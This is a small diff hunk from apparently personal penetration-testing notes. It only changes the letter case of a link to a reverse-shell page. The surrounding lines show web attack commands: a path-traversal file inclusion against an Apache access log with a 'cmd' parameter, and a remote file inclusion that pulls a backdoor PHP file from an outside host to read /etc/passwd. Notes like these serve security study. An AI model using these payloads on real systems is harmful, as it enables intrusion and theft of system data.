@@ -684,7 +684,7 @@ curl http://192.168.121.96/meteor/index.php?page=../../../../../../../var/log/ap
 ```bash
 http://192.168.45.125/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=whoami
 ```
-If vulnerable → [reverseshell](../09_weaponization/reverseshell.md)
+If vulnerable → [ReverseShell](../09_weaponization/ReverseShell.md)
 
 ```zsh
 curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.204/simple-backdoor.php&cmd=cat%20/etc/passwd"
